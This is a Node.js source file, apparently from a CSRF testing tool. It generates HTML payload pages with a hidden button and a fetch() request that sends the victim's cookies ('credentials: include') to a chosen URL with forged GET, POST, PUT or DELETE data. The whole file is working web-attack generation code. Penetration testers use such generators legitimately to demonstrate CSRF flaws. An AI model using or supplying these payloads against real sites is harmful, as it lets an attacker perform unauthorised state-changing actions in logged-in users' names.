/**
 * Fetch Template Generator
 * Generates fetch API templates for CSRF payloads
 */

const utils = require('../core/utils');

/**
 * Generate a fetch-based CSRF payload template
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with fetch code
 */
function getFetchTemplate(params) {
  const {
    url,
    method = 'POST',
    data = {},
    headers = {},
    csrfToken = null,
    contentType = 'application/json',
    buttonId = `csrf-fetch-${Date.now()}`,
    hiddenButton = true
  } = params;
  
  // Add CSRF token to headers if provided
  const allHeaders = { ...headers };
  if (csrfToken && csrfToken.headerName) {
    allHeaders[csrfToken.headerName] = csrfToken.value || '';
  }
  
  // Set content type header if provided
  if (contentType) {
    allHeaders['Content-Type'] = contentType;
  }
  
  // Convert data to appropriate format based on content type
  let formattedData;
  let bodyString;
  
  if (contentType.includes('application/json')) {
    // Add CSRF token to JSON data if provided and not in headers
    if (csrfToken && csrfToken.fieldName && !csrfToken.headerName) {
      formattedData = { ...data, [csrfToken.fieldName]: csrfToken.value || '' };
    } else {
      formattedData = data;
    }
    bodyString = `JSON.stringify(${JSON.stringify(formattedData)})`;
  } else if (contentType.includes('application/x-www-form-urlencoded')) {
    // Add CSRF token to form data if provided and not in headers
    if (csrfToken && csrfToken.fieldName && !csrfToken.headerName) {
      formattedData = { ...data, [csrfToken.fieldName]: csrfToken.value || '' };
    } else {
      formattedData = data;
    }
    bodyString = `"${utils.serializeObject(formattedData)}"`;
  } else if (contentType.includes('multipart/form-data')) {
    // Use FormData for multipart/form-data
    bodyString = `
      const formData = new FormData();
      ${Object.entries(data).map(([key, value]) => {
        if (typeof value === 'object') {
          return `formData.append("${key}", JSON.stringify(${JSON.stringify(value)}));`;
        } else {
          return `formData.append("${key}", "${value}");`;
        }
      }).join('\n      ')}
      ${csrfToken && csrfToken.fieldName && !csrfToken.headerName 
        ? `formData.append("${csrfToken.fieldName}", "${csrfToken.value || ''}");` 
        : ''}
      formData`;
    
    // Remove Content-Type header for FormData
    delete allHeaders['Content-Type'];
  } else {
    // Default to JSON
    formattedData = data;
    bodyString = `JSON.stringify(${JSON.stringify(formattedData)})`;
  }
  
  // Format fetch options
  const options = {
    method: method.toUpperCase(),
    headers: allHeaders,
    credentials: 'include' // Include cookies for cross-origin requests
  };
  
  // Only include body for non-GET requests
  if (method.toUpperCase() !== 'GET') {
    if (contentType.includes('multipart/form-data')) {
      options.body = '/* formData object created in the function */';
    } else {
      options.body = bodyString;
    }
  }
  
  const optionsString = JSON.stringify(options, null, 2)
    .replace('"/* formData object created in the function */"', bodyString)
    .replace(/"(credentials|method|headers|body)"/g, '$1');
  
  return `
<button id="${buttonId}" ${hiddenButton ? 'class="hidden"' : ''} onclick="sendFetchRequest()">Send Request</button>

<script>
  async function sendFetchRequest() {
    try {
      const options = ${optionsString};
      
      console.log("Sending fetch request to:", "${url}");
      const response = await fetch("${url}", options);
      
      console.log("Fetch response status:", response.status);
      if (response.ok) {
        console.log("Fetch request successful");
        const responseText = await response.text();
        console.log("Response:", responseText.substring(0, 100) + (responseText.length > 100 ? '...' : ''));
      } else {
        console.log("Fetch request failed");
      }
    } catch (error) {
      console.error("Fetch error:", error.message);
    }
  }
</script>`;
}

/**
 * Generate a fetch template for a GET request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with fetch code
 */
function getFetchGetTemplate(params) {
  return getFetchTemplate({ ...params, method: 'GET' });
}

/**
 * Generate a fetch template for a POST request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with fetch code
 */
function getFetchPostTemplate(params) {
  return getFetchTemplate({ ...params, method: 'POST' });
}

/**
 * Generate a fetch template for a PUT request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with fetch code
 */
function getFetchPutTemplate(params) {
  return getFetchTemplate({ ...params, method: 'PUT' });
}

/**
 * Generate a fetch template for a DELETE request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with fetch code
 */
function getFetchDeleteTemplate(params) {
  return getFetchTemplate({ ...params, method: 'DELETE' });
}

// Export functions
module.exports = {
  getFetchTemplate,
  getFetchGetTemplate,
  getFetchPostTemplate,
  getFetchPutTemplate,
  getFetchDeleteTemplate
};